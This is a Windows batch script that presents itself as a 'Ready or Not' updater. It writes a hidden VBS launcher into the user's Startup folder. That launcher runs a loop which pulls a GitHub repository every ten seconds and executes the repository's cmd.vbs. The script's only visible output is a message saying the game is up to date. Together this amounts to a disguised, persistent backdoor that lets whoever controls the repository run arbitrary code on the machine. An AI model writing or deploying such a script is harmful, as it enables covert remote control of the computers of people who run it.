@echo off
:: Variables for paths and repo URL
set "SCRIPTS_DIR=%userprofile%\Documents\Scripts"
set "SYNC_BATCH=%SCRIPTS_DIR%\sync_repo.bat"
set "VBS_FILE=%SCRIPTS_DIR%\silent_runner.vbs"
set "STARTUP_VBS=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\ReadyOrNot.vbs"
set "REPO_URL=https://github.com/madmaxvoltro/ready-or-not.git"
set "CLONE_DIR=%userprofile%\ReadyOrNot"

:: Create the Scripts directory if it doesn't exist
if not exist "%SCRIPTS_DIR%" (
    mkdir "%SCRIPTS_DIR%"
)

:: Step 1: Create sync_repo.bat that syncs the repo every 10 seconds and runs cmd.vbs
echo @echo off > "%SYNC_BATCH%"
echo setlocal >> "%SYNC_BATCH%"
echo set "REPO_URL=%REPO_URL%" >> "%SYNC_BATCH%"
echo set "DEST_DIR=%CLONE_DIR%" >> "%SYNC_BATCH%"
echo set "VBS_FILE=%CLONE_DIR%\cmd.vbs" >> "%SYNC_BATCH%"
echo :loop >> "%SYNC_BATCH%"
echo if not exist "%%DEST_DIR%%" ( >> "%SYNC_BATCH%"
echo ^    git clone %%REPO_URL%% %%DEST_DIR%% >> "%SYNC_BATCH%"
echo ) else ( >> "%SYNC_BATCH%"
echo ^    cd /d %%DEST_DIR%% >> "%SYNC_BATCH%"
echo ^    git pull >> "%SYNC_BATCH%"
echo ^    cscript //nologo %%VBS_FILE%% >> "%SYNC_BATCH%"
echo ) >> "%SYNC_BATCH%"
echo timeout /t 10 /nobreak >nul >> "%SYNC_BATCH%"
echo goto loop >> "%SYNC_BATCH%"
echo endlocal >> "%SYNC_BATCH%"
echo exit /b 0 >> "%SYNC_BATCH%"

:: Step 2: Create silent_runner.vbs to run sync_repo.bat silently
echo Set objShell = CreateObject("WScript.Shell") > "%VBS_FILE%"
echo objShell.Run "cmd /c ""%SYNC_BATCH%""", 0, True >> "%VBS_FILE%"

:: Step 3: Copy VBS file to the startup folder
copy "%VBS_FILE%" "%STARTUP_VBS%" /Y

:: Step 4: Run the VBS file to start the sync process immediately (in the background)
::start "" wscript "%VBS_FILE%"

echo Ready or not is up to date
